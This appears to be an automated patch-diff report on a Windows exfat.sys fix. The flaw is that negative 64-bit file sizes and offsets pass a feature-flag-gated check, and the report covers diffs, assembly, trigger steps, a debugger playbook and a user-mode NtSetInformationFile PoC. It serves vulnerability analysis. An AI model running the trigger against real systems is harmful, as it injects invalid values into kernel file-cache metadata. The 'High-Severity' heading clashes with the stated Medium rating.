Title: exfat.sys — Improper input validation of negative file size/offset in IRP_MJ_SET_INFORMATION handlers (CWE-20) fixed
Date: 2026-06-28
Slug: exfat_dd7b981e-exfat-report-20260628-223213
Category: Corpus
Author: Argus
Summary: KB5094127

---

## 1. Overview

| Item | Value |
|------|-------|
| Unpatched binary | `exfat_unpatched.sys` |
| Patched binary | `exfat_patched.sys` |
| Overall similarity | **0.9909** |
| Matched functions | 827 |
| Changed | 8 |
| Identical | 819 |
| Unmatched (either direction) | 0 |

**Verdict:** The patch makes the rejection of **negative (bit-63-set) 64-bit sizes/offsets** unconditional in three `IRP_MJ_SET_INFORMATION` handlers. In the unpatched build that rejection is gated behind a WIL velocity/feature-staging flag (`Feature_1337404728__private_IsEnabledDeviceUsage` @ `0x1C000A6A0`, reading the global feature dword `Feature_1337404728__private_featureState`). The patched build removes the flag dependency entirely (the whole `Feature_1337404728` feature is gone from the patched binary), so a value such as `EndOfFile = 0xFFFFFFFFFFFFFFFF` that the unpatched handler accepts when the feature is not enabled is now rejected with `STATUS_INVALID_PARAMETER`. The accepted value is written into the in-memory FCB FileSize/AllocationSize/ValidDataLength fields and passed to `CcSetFileSizes` (or, for the position class, into `FileObject->CurrentByteOffset`). This is an attacker-reachable input-validation flaw: any user with write access to a file on an exFAT volume can inject an unchecked negative/oversized file size or I/O offset into kernel file-cache metadata.

---

## 2. Vulnerability Summary

### Finding 1 — High-Severity Missing Validation in `FileEndOfFileInformation` / `FileAllocationInformation` / `FilePositionInformation`

- **Severity:** Medium. Demonstrable and reachable: an unauthenticated-value (attacker-controlled negative 64-bit size/offset) bypasses validation and is written into kernel file-cache metadata via a standard syscall. The concrete downstream memory-corruption / privilege-escalation outcome is plausible but is **not** demonstrated by this diff and is not asserted here.
- **Vulnerability class:** CWE-20 (Improper Input Validation) — the sign/range check on a 64-bit file size/offset is present but is conditioned on a velocity feature-staging gate in the unpatched build, so it does not run when the feature is not enabled.
- **Affected functions:**
  - `exfat!FppSetEndOfFileInfo (sub_1C00412C4)` — `FileEndOfFileInformation` handler (case 0x14)
  - `exfat!FppSetAllocationInfo (sub_1C0040F74)` — `FileAllocationInformation` handler (case 0x13)
  - `exfat!FppCommonSetInformation (sub_1C003E3A4)` — `IRP_MJ_SET_INFORMATION` dispatcher; inline `FilePositionInformation` handler (case 0x0e)

### Root Cause

In the unpatched driver, the validation that should reject any 64-bit size/offset value with **bit 63 set** (i.e. a negative value when interpreted as signed) is structured as:

```c
if (feature_flag_on && value < 0) return STATUS_INVALID_PARAMETER;
```

…or equivalently (for the position case):

```c
if (!feature_flag_on || value >= 0) { accept; }
```

The `feature_flag_on` test is implemented by `Feature_1337404728__private_IsEnabledDeviceUsage` @ `0x1C000A6A0`, which reads the global feature dword `Feature_1337404728__private_featureState`, tests bit 4, and otherwise queries velocity feature index 3 via `Feature_1337404728__private_IsEnabledFallback` @ `0x1C000A684`. This is a WIL velocity/feature-staging gate. That the patched build removes the gate and the entire `Feature_1337404728` feature and makes the check permanent indicates the gated check was not reliably active in the field (i.e. the feature resolved to `FALSE` / not-enabled), which is the condition under which the flaw is live.

Due to C-language short-circuit evaluation:
- In the EOF/Allocation handlers, `FALSE && value<0` never evaluates `value<0`.
- In the Position handler, `!FALSE || value>=0` is true regardless of the size.

A value such as `0xFFFFFFFFFFFFFFFF` therefore passes validation. The upstream "wraps below newSize" overflow guard is also bypassed for this specific value, because the expression `validDataLen + 1 + (-1)` equals `validDataLen`, which is **not** less than `-1` when compared signed — so the wrap-below-new-size check does not fire.

The negative value is then written to multiple FCB fields (`+0x20` FileSize, `+0x28` AllocationSize, `+0x110` ValidDataLength) and passed to `CcSetFileSizes`. This places an unchecked negative (huge-when-unsigned) file size into the cache manager's file-size state. Any downstream corruption depends on how those size fields are later consumed; that chain is not traced in this diff.

### Patch

The fix simply **removes the `Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)()` call entirely**, so the negative check becomes unconditional: `if (value < 0) return STATUS_INVALID_PARAMETER;`

### Attacker Entry Point & Data Flow

1. User-mode process opens a file on an exFAT volume with `GENERIC_WRITE` / `FILE_WRITE_DATA` / `FILE_WRITE_ATTRIBUTES`.
2. User calls `NtSetInformationFile` (or `ZwSetInformationFile`) with:
   - `FileInformationClass = FileEndOfFileInformation (0x14)` (or `0x13` / `0x0e`)
   - `FILE_END_OF_FILE_INFORMATION.EndOfFile.QuadPart` with **bit 63 set** (e.g. `0xFFFFFFFFFFFFFFFF`).
3. I/O Manager builds an `IRP_MJ_SET_INFORMATION` IRP.
4. Dispatched through exFAT's FSD wrappers (`FppFsdSetInformation (sub_1C003DF50)` / `FppFspDispatch (sub_1C0048270)`) → `exfat!FppCommonSetInformation (sub_1C003E3A4)` (the SET_INFORMATION dispatcher).
5. The dispatcher switches on the information class and:
   - case `0x14` → `exfat!FppSetEndOfFileInfo (sub_1C00412C4)` (EOF handler)
   - case `0x13` → `exfat!FppSetAllocationInfo (sub_1C0040F74)` (Allocation handler)
   - case `0x0e` → inline FilePosition handler.
6. The relevant handler calls the feature gate `exfat!Feature_1337404728__private_IsEnabledDeviceUsage` @ `0x1C000A6A0` reading global `Feature_1337404728__private_featureState`. When the feature is not enabled it returns `FALSE`, short-circuiting the sign check.
7. The huge/negative value is written into the FCB at `+0x20`, `+0x28`, `+0x110`, then passed to `CcSetFileSizes` (position class: into `FileObject->CurrentByteOffset`).
8. Kernel file-cache metadata now holds an attacker-controlled unchecked negative/oversized value. Whether this progresses to memory corruption depends on later consumers of these fields and is not established here.

---

## 3. Pseudocode Diff

### `FppSetEndOfFileInfo (sub_1C00412C4)` — FileEndOfFileInformation handler

```c
// ---------- UNPATCHED ----------
int64_t rdi_1 = *(int64_t*)Irp->AssociatedIrp.SystemBuffer;  // attacker EndOfFile

// Upstream overflow guard — bypassed by 0xFFFFFFFFFFFFFFFF
if (validDataLen + 1 + rdi_1 < rdi_1 || validDataLen + 1 + rdi_1 > maxFileSize)
    rdi = STATUS_DISK_FULL;

// *** THE FLAW: feature flag short-circuits the sign check ***
else if (!Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)() || rdi_1 >= 0)        // flag OFF (default) -> accept
{
    FCB->FileSize          = rdi_1;             // FCB+0x20 = 0xFFFFFFFFFFFFFFFF
    if (FCB->AllocationSize > rdi_1) FCB->AllocationSize = rdi_1; // +0x28
    if (FCB->ValidDataLength > rdi_1) FCB->ValidDataLength = rdi_1; // +0x110
    CcSetFileSizes(FileObject, &FCB->Sizes);    // cascading damage
}
else
    rdi = STATUS_INVALID_PARAMETER;             // only reached when flag ON


// ---------- PATCHED ----------
else if (rdi_1 >= 0)                            // <-- Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)() removed
{ ... same body ... }
else
    rdi = STATUS_INVALID_PARAMETER;             // unconditional rejection
```

### `FppSetAllocationInfo (sub_1C0040F74)` — FileAllocationInformation handler

```c
// UNPATCHED
if (Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)() && r14 < 0) return STATUS_INVALID_PARAMETER;   // flag short-circuits
// proceed with corrupted AllocationSize

// PATCHED
if (rbx < 0) return STATUS_INVALID_PARAMETER;                      // unconditional
```

### `FppCommonSetInformation (sub_1C003E3A4)` — inline FilePositionInformation (case 0x0e)

```c
// UNPATCHED
v = SystemBuffer->CurrentByteOffset;
if (!Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)() || v >= 0)                  // flag OFF -> accept any value
    FileObject->CurrentByteOffset = v;
else
    return STATUS_INVALID_PARAMETER;

// PATCHED
v = SystemBuffer->CurrentByteOffset;
if (v < 0) return STATUS_INVALID_PARAMETER;      // unconditional
FileObject->CurrentByteOffset = v;
```

---

## 4. Assembly Analysis

### `FppSetEndOfFileInfo (sub_1C00412C4)` — FileEndOfFileInformation handler (the primary corruption site)

**UNPATCHED:**

```asm
; --- load attacker-controlled EndOfFile ---
0x1c0041307: mov rcx, qword [rdx+0x18]   ; rcx = Irp->AssociatedIrp.SystemBuffer
0x1c0041333: mov rdi, qword [rcx]        ; rdi = EndOfFile.QuadPart  [ATTACKER CONTROLLED]

; --- bypassed overflow guards (defeated by 0xFFFFFFFFFFFFFFFF) ---
0x1c004133d: inc r8                       ; r8 = ValidDataLength+1
            add r8, rdi                    ; + EndOfFile
            cmp r8, rdi
            jl  0x1c0041602                ; signed wrap-below check
0x1c0041366: cmp r8, rdx
            jg  0x1c0041602                ; max-size check

; *** FEATURE-FLAG GATE (the flaw) ***
0x1c004136f: call Feature_1337404728__private_IsEnabledDeviceUsage              ; <-- PATCH REMOVES THIS CALL
0x1c0041374: test eax, eax
0x1c0041376: je  0x1c0041387               ; flag==0 (default) -> SKIP sign check, PROCESS
0x1c0041378: test rdi, rdi                 ; only reached when flag != 0
0x1c004137b: jns 0x1c0041387
0x1c004137d: mov edi, 0xc000000d           ; STATUS_INVALID_PARAMETER (only on flag-on)

; *** FCB METADATA CORRUPTION ***
0x1c004154f: mov qword [rbx+0x20], rdi     ; FCB->FileSize = huge/negative
0x1c0041558: mov qword [rbx+0x28], rdi     ; FCB->AllocationSize
0x1c0041561: mov qword [rbx+0x110], rdi    ; FCB->ValidDataLength
            ; ... then CcSetFileSizes / FsRtlNotifyFullReportChange ...
```

**PATCHED:** The `call Feature_1337404728__private_IsEnabledDeviceUsage` is removed entirely; `test rdi, rdi; jns proceed; mov edi,0xC000000D` becomes unconditional.

### Feature-gate helper `Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)` (the function the patch removes calls to)

```asm
0x1c000a6aa: mov  eax, cs:Feature_1337404728__private_featureState  ; global feature dword
0x1c000a6b4: test al, 0x10                       ; bit 4 set (cached value present)?
0x1c000a6b6: jz   0x1c000a6bd                     ; not cached -> query feature index 3 (Feature_1337404728__private_IsEnabledFallback @ 0x1C000A684)
0x1c000a6b8: and  eax, 0x1                        ; cached -> return bit 0
; resolves to FALSE (not-enabled) on the affected systems
```

### `FppSetAllocationInfo (sub_1C0040F74)` — FileAllocationInformation handler

**UNPATCHED:**

```asm
call Feature_1337404728__private_IsEnabledDeviceUsage
test eax, eax
je   0x1c0040fe4                                ; flag OFF -> skip sign check
test r14, r14
jns  0x1c0040fe4
mov  eax, 0xc000000d
```

**PATCHED:**

```asm
test rbx, rbx
jns  0x1c0040fce
mov  eax, 0xc000000d                            ; unconditional
```

### `FppCommonSetInformation (sub_1C003E3A4)` — inline FilePositionInformation (case 0x0e)

**UNPATCHED:**

```asm
mov rbx, qword [rsi+0x18]   ; &SystemBuffer->CurrentByteOffset path
call Feature_1337404728__private_IsEnabledDeviceUsage             ; feature gate
test eax, eax
je   0x1c003e7bb             ; flag OFF -> take accept branch
...
cmp qword [rbx], 0x0
jl   0x1c003e742             ; sign check only reached when flag ON
```

**PATCHED:**

```asm
mov r8,  qword [rsi+0x18]
mov rdx, qword [r8]
test rdx, rdx
js   0x1c003e742             ; unconditional negative rejection
```

---

## 5. Trigger Conditions

1. **Target access.** Open a file residing on an exFAT-formatted volume. The handle must grant `GENERIC_WRITE` (or at minimum `FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES`). Any user with write access to such a file qualifies; no admin rights strictly required.
2. **Feature must resolve to not-enabled** (the bypass condition). `Feature_1337404728__private_IsEnabledDeviceUsage` @ `0x1C000A6A0` must return `FALSE` (feature dword `Feature_1337404728__private_featureState` bit 4 clear and velocity feature index 3 not enabled). That the patched build retires this feature and makes the check permanent indicates this was the effective state prior to the fix.
3. **Build the input buffer.** Construct a `FILE_END_OF_FILE_INFORMATION` (8 bytes) with `EndOfFile.QuadPart` having bit 63 set. The most reliable value is `0xFFFFFFFFFFFFFFFF` because it also defeats the upstream signed-overflow guard (`validDataLen+1+(-1) == validDataLen`, not `< -1`). Alternative valid trigger values: `0x8000000000000000`, or any other bit-63-set value.
4. **Issue the syscall.** `NtSetInformationFile(hFile, &iosb, &eoi, sizeof(eoi), FileEndOfFileInformation /*0x14*/)`. Equivalent triggers:
   - `FileAllocationInformation (0x13)` with `AllocationSize.QuadPart` bit-63-set, or
   - `FilePositionInformation (0x0e)` with `CurrentByteOffset.QuadPart` bit-63-set (then issue a read/write to materialize the OOB offset).
5. **File must not be mapped** by another process at the time of the EOF/Allocation call (`MmCanCanFileBeTruncated` must permit the extend/truncate). Simplest: use a regular file opened normally, no mapped sections.
6. **No race or timing constraints** for the corruption step itself. The damage cascades during cache teardown, subsequent I/O, or close.
7. **Observable confirmation.**
   - On the unpatched binary the `NtSetInformationFile` call returns `STATUS_SUCCESS`; on the patched binary the same input returns `STATUS_INVALID_PARAMETER` (`0xC000000D`). This is the directly observable, demonstrable difference.
   - In the debugger, `[rbx+0x20]` (FCB FileSize) is observed equal to the attacker value (e.g. `0xFFFFFFFFFFFFFFFF`) at `0x1c004154f` on the unpatched binary; the patched binary rejects the input before this write.

---

## 6. Exploit Primitive & Development Notes

### Primitive

The demonstrable primitive is the injection of an attacker-controlled, unchecked negative (bit-63-set / huge-when-unsigned) 64-bit value into kernel file-cache metadata:

- EOF/Allocation paths: `FCB->FileSize` (and conditionally `AllocationSize` / `ValidDataLength`) are set to the attacker value and passed to `CcSetFileSizes`.
- Position path: `FileObject->CurrentByteOffset` is set to the attacker value.

Progression from this state to a concrete memory-corruption or privilege-escalation primitive would depend on downstream consumers of these fields. That progression is not traced in this diff and is not claimed here; the impact established by the binaries is the acceptance of an invalid size/offset into kernel metadata that the patched build rejects.

---

## 7. Debugger PoC Playbook

For an analyst with WinDbg/KD attached to the **unpatched** `exfat.sys`:

### Breakpoints

```text
bp exfat!FppSetEndOfFileInfo (sub_1C00412C4)             ; EOF handler entry — rcx=Context, rdx=IRP
bp exfat+0x41333                   ; load attacker EndOfFile into rdi
bp exfat+0x4136f                   ; feature-gate call (patch removes this)
bp exfat!Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)             ; the feature gate itself
bp exfat+0x4154f                   ; FCB->FileSize corruption write
bp exfat+0x41558                   ; FCB->AllocationSize write
bp exfat+0x41561                   ; FCB->ValidDataLength write
bp exfat!FppSetAllocationInfo (sub_1C0040F74)             ; Allocation handler (alternative trigger)
bp exfat+0x3E7A8                   ; FilePositionInformation inline path
```

### What to Inspect

| Stop | Register/Memory | Why |
|------|------------------|-----|
| `exfat+0x41333` | `rdi` after `mov rdi, qword [rcx]` | Should equal your injected value (e.g. `0xFFFFFFFFFFFFFFFF`). |
| `exfat!Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)` exit (`+0xa6cc`) | `eax` | `0` when the feature is not-enabled — confirms the bypass is active. |
| `exfat+0x4136f` | step once, then `r eax` | On unpatched default system: `eax=0` → `je 0x41387` taken. |
| `exfat+0x41378` | (only reached if flag ON) | `test rdi,rdi; jns` is the dead-on-default code path. |
| `exfat+0x4154f` | `rbx` = FCB; `[rbx+0x20]` after step | Confirms the corrupted FileSize write. |

Also watch:

- `Feature_1337404728__private_featureState & 0x10` — feature dword bit 4 (cached-value-present) state, which controls whether the gate returns the cached bit 0 or falls back to the velocity query.
- `[rbx+0x28]`, `[rbx+0x110]` — adjacent FCB size fields.
- `rdx` (IRP) at function entry → follow `dx->AssociatedIrp.SystemBuffer` (+0x18) to confirm the input.

### Key Offsets

- `0x1c0041333` — `mov rdi, qword [rcx]` — attacker size loaded.
- `0x1c004133d`–`0x1c0041366` — overflow/max-size guards (bypassed for `-1`).
- `0x1c004136f` — `call Feature_1337404728__private_IsEnabledDeviceUsage` — **the feature gate the patch removes**.
- `0x1c0041376` — `je 0x1c0041387` — bypass jump (taken when flag OFF).
- `0x1c0041378`–`0x1c004137b` — `test rdi,rdi; jns` — sign check, only effective when flag ON in unpatched.
- `0x1c004154f` / `0x1c0041558` / `0x1c0041561` — three FCB size-corruption writes.

### Trigger Setup (User-Mode PoC Skeleton)

```c
#include <windows.h>
#include <winternl.h>

// FILE_END_OF_FILE_INFORMATION is just LARGE_INTEGER
HRESULT PoC(HANDLE hFile) {
    IO_STATUS_BLOCK iosb = {0};
    LARGE_INTEGER eoi;
    eoi.QuadPart = 0xFFFFFFFFFFFFFFFFll;          // bit 63 set

    NTSTATUS st = NtSetInformationFile(
        hFile, &iosb,
        &eoi, sizeof(eoi),
        FileEndOfFileInformation);                // 0x14

    // On unpatched, feature-not-enabled: st == 0 (STATUS_SUCCESS)
    // On patched:                      st == 0xC000000D
    return st;
}
```

To obtain the handle:

```c
HANDLE h = CreateFileW(L"X:\\poc.txt",            // X: must be exFAT
                       GENERIC_WRITE, 0, NULL,
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
PoC(h);
CloseHandle(h);
```

### Expected Observation

- At `0x1c004136f` → `0x1c0041376`, the `je` is taken on the unpatched binary when the feature resolves to not-enabled.
- Control reaches `0x1c004154f` and `[rbx+0x20]` becomes `0xFFFFFFFFFFFFFFFF`; `CcSetFileSizes` is invoked with this value.
- On the patched binary, `test rdi,rdi; jns; mov edi,0xC000000D` (at the relocated handler `0x1C00412AC`) rejects the input, the IRP completes with `STATUS_INVALID_PARAMETER`, and the FCB is not modified.
- The directly observable, demonstrable difference is the return status (`STATUS_SUCCESS` unpatched vs `STATUS_INVALID_PARAMETER` patched) and whether the FCB size fields are written.

### Struct/Offset Notes

FCB and IRP offsets referenced by the corruption site (from the disassembly of `FppSetEndOfFileInfo`):

| Offset | Field |
|--------|-------|
| `+0x20` | **FileSize** (written at `0x1c004154f`) |
| `+0x28` | **AllocationSize** (written at `0x1c0041558`) |
| `+0x110` | **ValidDataLength** (written at `0x1c0041561`) |

IRP layout used: `Irp->AssociatedIrp.SystemBuffer` at `IRP+0x18`. `FILE_END_OF_FILE_INFORMATION.EndOfFile.QuadPart` is the first (and only) qword.

---

## 8. Changed Functions — Full Triage

### Security-Relevant (3)

| Function | Sim | Change |
|----------|-----|--------|
| `FppCommonSetInformation (sub_1C003E3A4)` | 0.9848 | `IRP_MJ_SET_INFORMATION` dispatcher. Inline `FilePositionInformation` (case 0xe) handler lost the feature-gate short-circuit; the negative-offset check is now unconditional. Also dispatches cases 0x13 / 0x14 to the fixed sub-handlers. |
| `FppSetEndOfFileInfo (sub_1C00412C4)` | 0.9789 | `FileEndOfFileInformation` handler. Removed `Feature_1337404728__private_IsEnabledDeviceUsage (sub_1C000A6A0)` call; sign check now unconditional. Fixes the primary FCB FileSize corruption site (`+0x20`/`+0x28`/`+0x110`). |
| `FppSetAllocationInfo (sub_1C0040F74)` | 0.9714 | `FileAllocationInformation` handler. Same fix pattern — feature gate removed, negative-size rejection unconditional. |

### Behavioral / Refactor (5)

| Function | Sim | Change |
|----------|-----|--------|
| `wil_details_IsEnabledFallback (sub_1C00018D8)` | 0.939 | WIL feature-state helper; refactored to drop a pointer argument in favor of a global context. |
| `wil_details_FeatureStateCache_TryEnableDeviceUsageFastPath (sub_1C000196C)` | 0.818 | Atomic flag-set helper (`lock or` / `lock cmpxchg`); refactored to operate on a global instead of an arg pointer. Atomic semantics preserved. |
| `Feature_427089208__private_IsEnabledFallback (sub_1C0001EA0)` | 0.648 | Tiny thunk calling the helper with one fewer argument. Pure signature/register-allocation change. |
| `wil_details_FeatureReporting_ReportUsageToServiceDirect (sub_1C000137C)` | 0.972 | WIL feature-usage/telemetry reporting helper; refactored to use a global context instead of an arg pointer. |
| `wil_details_FeatureReporting_ReportUsageToService (sub_1C0001464)` | 0.989 | Telemetry wrapper (`id` → `sub-id` switch → `wil_details_FeatureReporting_ReportUsageToServiceDirect (sub_1C000137C)`); refactored arg passing. Control flow unchanged. |

*The behavioral/cosmetic changes are not security-relevant on their own. They are consistent with a broader refactor of the feature-telemetry plumbing that enabled the patch team to remove the flag dependency cleanly.*

---

## 9. Unmatched Functions

None — both binaries have identical function sets (`unmatched_unpatched = 0`, `unmatched_patched = 0`). No added sanitizers and no removed mitigations; the security delta is entirely the in-place edit to the three handlers listed above.

---

## 10. Confidence & Caveats

### Confidence: **High on the mechanism; bounded on impact.**

Rationale:
- The three diffed handlers all share an identical, syntactically clear pattern (feature-flag short-circuit around a sign check) that the patch converts to unconditional rejections. This is fully verified in both builds at the real addresses.
- The writes of the accepted value into FCB fields (`+0x20`/`+0x28`/`+0x110`) and the call to `CcSetFileSizes` are unambiguous in the disassembly.
- The feature gate resolving to not-enabled is consistent with Windows velocity/feature-staging conventions and with the patch retiring the whole feature.
- The onward memory-corruption / privilege-escalation impact is not demonstrated by this diff, which is why the severity is bounded at Medium.

### Assumptions

- The feature `Feature_1337404728` resolves to not-enabled (`featureState` bit 4 clear, velocity feature index 3 not enabled) on the affected systems. This is inferred from velocity-staging conventions and from the patch retiring the feature and making the check permanent; it should be confirmed against a target system's actual configuration.
- The call chain `NtSetInformationFile → IRP_MJ_SET_INFORMATION → FppCommonSetInformation (0x1C003E3A4) → FppSetEndOfFileInfo (0x1C00412C4) / FppSetAllocationInfo (0x1C0040F74)` is derived from the dispatcher's switch on `FILE_INFORMATION_CLASS`, the direct call sites (`0x1C003E786` EOF, `0x1C003E79E` Allocation) and the inline handler at case 0x0e (`0x1C003E7A8`). The FSD wrapper `FppFsdSetInformation` calls this dispatcher at `0x1C003DFA7`.
- The "wraps below newSize" guard bypass for `0xFFFFFFFFFFFFFFFF` relies on the identity `validDataLen+1+(-1) == validDataLen` and the signed comparison `validDataLen < -1` being false for any non-negative `validDataLen`. This matches the assembly at `0x1c004133d`–`0x1c0041366`.

### To Verify Before PoC

1. **Confirm the feature state** on the target system: `Feature_1337404728__private_featureState` bit 4 clear and velocity feature 3 not enabled means the bypass is live.
2. **Confirm the dispatcher chain** by setting `bp exfat!FppCommonSetInformation` and breaking on `NtSetInformationFile(FileEndOfFileInformation)`.
3. **Confirm IRP+0x18 layout** for the target Windows version (SystemBuffer offset).
4. **Test the simplest trigger first** (`EndOfFile = 0xFFFFFFFFFFFFFFFF`); other bit-63-set values behave equivalently at the validation gate.
5. **Characterize downstream impact** by tracing how the poisoned `FCB->FileSize`/`AllocationSize`/`ValidDataLength` and `FileObject->CurrentByteOffset` are consumed by subsequent cached I/O and cache teardown before asserting a corruption/EoP outcome.
